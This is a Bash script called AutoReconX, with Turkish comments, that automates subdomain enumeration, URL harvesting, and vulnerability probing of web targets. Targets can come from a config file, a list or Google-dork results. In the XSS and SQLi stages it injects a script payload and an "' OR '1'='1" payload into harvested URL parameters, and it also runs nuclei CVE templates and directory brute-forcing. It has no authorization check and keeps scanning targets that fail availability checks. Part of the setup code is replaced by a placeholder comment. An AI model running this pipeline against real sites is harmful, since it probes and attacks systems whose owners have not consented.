#!/bin/bash

set -e

# Renkli çıktılar
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Betiğin başlangıç zamanı
START_TIME=$(date +%s)

# İlerleme çubuğu fonksiyonu
show_progress() {
    local current=$1
    local total=$2
    local stage=$3
    local width=50
    local percent=$((current * 100 / total))
    local progress=$((current * width / total))
    local elapsed=$(( $(date +%s) - START_TIME ))
    
    printf "\r${BLUE}[${YELLOW}%3d%%${BLUE}] [${GREEN}%${width}s${BLUE}] ${YELLOW}%s${NC} [Elapsed: %02d:%02d]" \
        $percent \
        $(printf "%${progress}s" | tr ' ' '#') \
        "$stage" \
        $((elapsed / 60)) $((elapsed % 60))
}

# Araç dizinleri
TOOLS_DIR="$HOME/.autoreconx_tools"
BIN_DIR="$HOME/.local/bin"
mkdir -p "$TOOLS_DIR" "$BIN_DIR"

# Başlangıç mesajı
echo -e "${GREEN}[*] AutoReconX.sh başlatılıyor...${NC}"

# Betiğin gerçek yolunu bul
SCRIPT_DIR=$(cd "$(dirname "${BASH_SOURCE[0]}")" &>/dev/null && pwd)

# [Önceki fonksiyonlar aynen korundu: fix_gpg, update_path, version_compare, install_go, install_python, install_go_tool, install_system_deps, update_nuclei_templates, install_dependencies]

# Ana script devamı...
CONFIG_PATH="$SCRIPT_DIR/../config/setting.json"
OUTER_DIR="results"
WORDLIST="${WORDLIST:-$HOME/SecLists/Discovery/Web-Content/raft-medium-words.txt}"

# Eğer SecLists yoksa kur
if [ ! -d "$HOME/SecLists" ]; then
    echo -e "${YELLOW}[*] SecLists indiriliyor...${NC}"
    if git clone --depth 1 https://github.com/danielmiessler/SecLists.git "$HOME/SecLists"; then
        echo -e "${GREEN}[+] SecLists başarıyla indirildi${NC}"
    else
        echo -e "${RED}[-] SecLists indirme başarısız oldu!${NC}"
        echo -e "${YELLOW}[!] Alternatif bir kelime listesi kullanabilirsiniz:${NC}"
        echo -e "${YELLOW}[!] WORDLIST=/path/to/wordlist.txt ./AutoReconX.sh${NC}"
    fi
fi

# JSON config'ini oku
if [ ! -f "$CONFIG_PATH" ]; then
    echo -e "${RED}[!] Hata: Config dosyası bulunamadı: $CONFIG_PATH${NC}"
    exit 1
fi

# JSON config'ini oku
TARGET_FILE_CHECK=$(jq -r '.TARGET_FILE_CHECK' "$CONFIG_PATH")
TARGET=$(jq -r '.TARGET' "$CONFIG_PATH")
TARGET_FILE_PATH=$(jq -r '.TARGET_FILE_PATH' "$CONFIG_PATH")
DORK_CHECK=$(jq -r '.DORK_CHECK' "$CONFIG_PATH")
DORK_FILE_CHECK=$(jq -r '.DORK_FILE_CHECK' "$CONFIG_PATH")

# Hedef listesi oluştur
targets=()

# DORK_CHECK veya DORK_FILE_CHECK aktifse, dork_output.txt'den hedefleri oku
if [[ "$DORK_CHECK" == "on" || "$DORK_FILE_CHECK" == "on" ]]; then
    DORK_OUTPUT_FILE="results/dork_output.txt"
    if [ -f "$DORK_OUTPUT_FILE" ]; then
        echo -e "${YELLOW}[*] Hedefler dork_output.txt dosyasından okunuyor${NC}"
        # Daha esnek URL/domain algılama
        while IFS= read -r line; do
            # Satırı temizle
            cleaned=$(echo "$line" | xargs)
            
            # Boş satırları atla
            if [[ -z "$cleaned" ]]; then
                continue
            fi
            
            # HTTP/HTTPS ile başlıyorsa doğrudan ekle
            if [[ "$cleaned" =~ ^https?:// ]]; then
                targets+=("$cleaned")
            # Domain veya IP formatındaysa http:// ekleyerek ekle
            elif [[ "$cleaned" =~ ^([a-zA-Z0-9.-]+\.[a-zA-Z]{2,}|[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})(:[0-9]+)?$ ]]; then
                targets+=("http://$cleaned")
            else
                echo -e "${YELLOW}[!] Uyarı: Geçersiz hedef formatı - '$cleaned' atlanıyor${NC}"
            fi
        done < "$DORK_OUTPUT_FILE"
    else
        echo -e "${RED}[!] Hata: dork_output.txt dosyası bulunamadı!${NC}"
        exit 1
    fi
elif [[ "$TARGET_FILE_CHECK" == "on" ]]; then
    echo -e "${YELLOW}[*] Hedefler dosyadan okunuyor: $TARGET_FILE_PATH${NC}"
    
    # Hedef dosyasının varlığını kontrol et
    if [ ! -f "$TARGET_FILE_PATH" ]; then
        echo -e "${RED}[!] Hata: Hedef dosyası bulunamadı: $TARGET_FILE_PATH${NC}"
        exit 1
    fi
    
    while IFS= read -r line; do
        cleaned=$(echo "$line" | xargs)
        if [[ -n "$cleaned" ]]; then
            # HTTP/HTTPS ile başlıyorsa doğrudan ekle
            if [[ "$cleaned" =~ ^https?:// ]]; then
                targets+=("$cleaned")
            # Domain veya IP formatındaysa http:// ekleyerek ekle
            elif [[ "$cleaned" =~ ^([a-zA-Z0-9.-]+\.[a-zA-Z]{2,}|[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})(:[0-9]+)?$ ]]; then
                targets+=("http://$cleaned")
            else
                echo -e "${YELLOW}[!] Uyarı: Geçersiz hedef formatı - '$cleaned' atlanıyor${NC}"
            fi
        fi
    done < "$TARGET_FILE_PATH"
else
    echo -e "${YELLOW}[*] Tek hedef kullanılacak: $TARGET${NC}"
    # Hedef formatını kontrol et
    if [[ "$TARGET" =~ ^https?:// ]]; then
        targets+=("$TARGET")
    elif [[ "$TARGET" =~ ^([a-zA-Z0-9.-]+\.[a-zA-Z]{2,}|[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})(:[0-9]+)?$ ]]; then
        targets+=("http://$TARGET")
    else
        echo -e "${RED}[!] Hata: Geçersiz hedef formatı: $TARGET${NC}"
        exit 1
    fi
fi

# Hedef sayısını kontrol et
if [ ${#targets[@]} -eq 0 ]; then
    echo -e "${RED}[!] Hata: Hiçbir geçerli hedef bulunamadı!${NC}"
    exit 1
fi

# Geliştirilmiş site kontrol fonksiyonu
check_site_availability() {
    local target=$1
    local host=$(echo "$target" | sed -E 's#(https?://)?([^:/]+).*#\2#')
    local success=false
    
    echo -e "${YELLOW}[*] Kontrol ediliyor: $target${NC}"
    
    # 1. Ping kontrolü (3 deneme, 2 saniye timeout)
    if ping -c 3 -W 2 "$host" &>/dev/null; then
        echo -e "${GREEN}[+] Ping başarılı: $host${NC}"
        success=true
    else
        echo -e "${RED}[-] Ping başarısız: $host${NC}"
    fi
    
    # 2. HTTP/HTTPS erişim kontrolü (curl ile)
    local http_code=$(curl --max-time 10 -k -s -I -o /dev/null -w "%{http_code}" "$target" 2>/dev/null || true)
    
    if [[ "$http_code" =~ ^[23] ]]; then
        echo -e "${GREEN}[+] HTTP erişimi başarılı: $target (Status: $http_code)${NC}"
        success=true
    else
        echo -e "${RED}[-] HTTP erişimi başarısız: $target (Status: ${http_code:-"Connection failed"})${NC}"
    fi
    
    # Ping veya HTTP başarılıysa true döndür
    if $success; then
        return 0
    else
        return 1
    fi
}

# Aktif hedefleri kontrol et
active_targets=()
mkdir -p "$OUTER_DIR/logs"

echo -e "${YELLOW}[*] Canlı hedefler kontrol ediliyor...${NC}"
for target in "${targets[@]}"; do
    if check_site_availability "$target"; then
        active_targets+=("$target")
    else
        echo -e "${YELLOW}[!] Uyarı: $target için bazı kontroller başarısız oldu, ancak taramaya devam edilecek${NC}"
        active_targets+=("$target")
    fi
done

# Hiçbir hedef yoksa çık
if [ ${#active_targets[@]} -eq 0 ]; then
    echo -e "${RED}[!] Hiçbir hedef bulunamadı. Çıkılıyor.${NC}"
    exit 1
fi

# Tüm hedefler için tarama başlat (aktif olmayanlar dahil)
TOTAL_TARGETS=${#active_targets[@]}
CURRENT_TARGET=0

for target in "${active_targets[@]}"; do
    ((CURRENT_TARGET++))
    domain=$(echo "$target" | sed -E 's#https?://([^:/]+).*#\1#')
    outdir="$OUTER_DIR/$domain"
    mkdir -p "$outdir"

    show_progress $CURRENT_TARGET $TOTAL_TARGETS "Tarama başlatılıyor: $domain"
    echo -e "\n${YELLOW}🔎 $target için tarama başlatılıyor...${NC}"

    ## Subdomain tarama
    show_progress $CURRENT_TARGET $TOTAL_TARGETS "Subdomain tarama"
    echo -e "${YELLOW}[1] Subdomain tarama${NC}"
    subfinder -d "$domain" -silent > "$outdir/subs.txt" 2>"$OUTER_DIR/logs/subfinder_$domain.log" || echo -e "${RED}[-] Subfinder başarısız oldu, log: $OUTER_DIR/logs/subfinder_$domain.log${NC}"
    
    amass enum -passive -d "$domain" 2>"$OUTER_DIR/logs/amass_$domain.log" | anew "$outdir/subs.txt" || echo -e "${RED}[-] Amass başarısız oldu, log: $OUTER_DIR/logs/amass_$domain.log${NC}"

    ## DNS çözümleme
    show_progress $CURRENT_TARGET $TOTAL_TARGETS "DNS çözümleme"
    if [ -s "$outdir/subs.txt" ]; then
        echo -e "${YELLOW}[2] DNS çözümleme${NC}"
        dnsx -l "$outdir/subs.txt" -silent -a -o "$outdir/resolved_subs.txt" 2>"$OUTER_DIR/logs/dnsx_$domain.log" || echo -e "${RED}[-] DNSx başarısız oldu, log: $OUTER_DIR/logs/dnsx_$domain.log${NC}"
    else
        echo -e "${RED}[-] Subdomain bulunamadı, DNS çözümleme atlanıyor${NC}"
    fi

    ## HTTP canlılık
    show_progress $CURRENT_TARGET $TOTAL_TARGETS "HTTP canlılık testi"
    if [ -s "$outdir/resolved_subs.txt" ]; then
        echo -e "${YELLOW}[3] HTTP canlılık testi${NC}"
        httpx -l "$outdir/resolved_subs.txt" -silent -title -tech-detect -status-code > "$outdir/httpx_raw.txt" 2>"$OUTER_DIR/logs/httpx_$domain.log" || echo -e "${RED}[-] httpx başarısız oldu, log: $OUTER_DIR/logs/httpx_$domain.log${NC}"
        cut -d' ' -f1 "$outdir/httpx_raw.txt" > "$outdir/live.txt" 2>/dev/null
    else
        echo -e "${RED}[-] Çözümlenmiş subdomain bulunamadı, HTTP canlılık testi atlanıyor${NC}"
    fi

    ## Wayback endpoint
    show_progress $CURRENT_TARGET $TOTAL_TARGETS "Wayback URL toplama"
    if [ -s "$outdir/live.txt" ]; then
        echo -e "${YELLOW}[4] Wayback URL toplama${NC}"
        gau < "$outdir/live.txt" 2>"$OUTER_DIR/logs/gau_$domain.log" | grep -iE "\.php|\.aspx|\.jsp|\.json|\.js|=" | anew "$outdir/waybacks.txt" || echo -e "${RED}[-] gau başarısız oldu, log: $OUTER_DIR/logs/gau_$domain.log${NC}"
    else
        echo -e "${RED}[-] Canlı URL bulunamadı, Wayback taraması atlanıyor${NC}"
    fi

    ## JS Linkleri
    show_progress $CURRENT_TARGET $TOTAL_TARGETS "JavaScript linkleri toplama"
    if [ -s "$outdir/live.txt" ]; then
        echo -e "${YELLOW}[5] JavaScript linkleri toplama${NC}"
        getJS --input "$outdir/live.txt" --output "$outdir/js_links.txt" 2>"$OUTER_DIR/logs/getJS_$domain.log" || echo -e "${RED}[-] getJS başarısız oldu, log: $OUTER_DIR/logs/getJS_$domain.log${NC}"
    else
        echo -e "${RED}[-] Canlı URL bulunamadı, JS link toplama atlanıyor${NC}"
    fi

    ## XSS testi
    show_progress $CURRENT_TARGET $TOTAL_TARGETS "XSS testi"
    if [ -s "$outdir/waybacks.txt" ]; then
        echo -e "${YELLOW}[6] XSS testi${NC}"
        gf xss < "$outdir/waybacks.txt" | qsreplace '"><script>alert(1)</script>' | httpx -silent -status-code -location > "$outdir/xss.txt" 2>"$OUTER_DIR/logs/xss_$domain.log" || echo -e "${RED}[-] XSS testi başarısız oldu, log: $OUTER_DIR/logs/xss_$domain.log${NC}"
    else
        echo -e "${RED}[-] Wayback URL bulunamadı, XSS testi atlanıyor${NC}"
    fi

    ## SQLi testi
    show_progress $CURRENT_TARGET $TOTAL_TARGETS "SQLi testi"
    if [ -s "$outdir/waybacks.txt" ]; then
        echo -e "${YELLOW}[7] SQLi testi${NC}"
        gf sqli < "$outdir/waybacks.txt" | qsreplace "' OR '1'='1" | httpx -silent -status-code -location > "$outdir/sqli.txt" 2>"$OUTER_DIR/logs/sqli_$domain.log" || echo -e "${RED}[-] SQLi testi başarısız oldu, log: $OUTER_DIR/logs/sqli_$domain.log${NC}"
    else
        echo -e "${RED}[-] Wayback URL bulunamadı, SQLi testi atlanıyor${NC}"
    fi

    ## Nuclei
    show_progress $CURRENT_TARGET $TOTAL_TARGETS "Nuclei taraması"
    if [ -s "$outdir/live.txt" ]; then
        echo -e "${YELLOW}[8] Nuclei taraması${NC}"
        nuclei -l "$outdir/live.txt" -t cves/ -o "$outdir/nuclei-cves.txt" 2>"$OUTER_DIR/logs/nuclei-cves_$domain.log" || echo -e "${RED}[-] Nuclei (CVEs) başarısız oldu, log: $OUTER_DIR/logs/nuclei-cves_$domain.log${NC}"
        nuclei -l "$outdir/live.txt" -t exposures/ -t misconfiguration/ -t vulnerabilities/ -o "$outdir/nuclei-all.txt" 2>"$OUTER_DIR/logs/nuclei-all_$domain.log" || echo -e "${RED}[-] Nuclei (all) başarısız oldu, log: $OUTER_DIR/logs/nuclei-all_$domain.log${NC}"
    else
        echo -e "${RED}[-] Canlı URL bulunamadı, Nuclei taraması atlanıyor${NC}"
    fi

    ## Dirsearch
    show_progress $CURRENT_TARGET $TOTAL_TARGETS "Dizin tarama"
    if [ -s "$outdir/live.txt" ]; then
        echo -e "${YELLOW}[9] Dizin tarama${NC}"
        while IFS= read -r url; do
            safe_url=$(echo "$url" | sed 's/[^a-zA-Z0-9]/_/g')
            dirsearch -u "$url" -e php,html,js,json,txt -w "$WORDLIST" --full-url -q -o "$outdir/dirsearch-${safe_url}.txt" 2>"$OUTER_DIR/logs/dirsearch_${safe_url}.log" || echo -e "${RED}[-] Dirsearch ($url) başarısız oldu, log: $OUTER_DIR/logs/dirsearch_${safe_url}.log${NC}"
        done < "$outdir/live.txt"
    else
        echo -e "${RED}[-] Canlı URL bulunamadı, Dizin taraması atlanıyor${NC}"
    fi

    show_progress $CURRENT_TARGET $TOTAL_TARGETS "Tarama tamamlandı"
    echo -e "\n${GREEN}✅ $target taraması tamamlandı. Çıktılar: $outdir${NC}"
done

# Toplam geçen süreyi hesapla
TOTAL_TIME=$(( $(date +%s) - START_TIME ))
echo -e "${GREEN}🎉 Tüm hedefler AutoReconX ile başarıyla tarandı! Toplam süre: $((TOTAL_TIME / 60)) dakika $((TOTAL_TIME % 60)) saniye${NC}"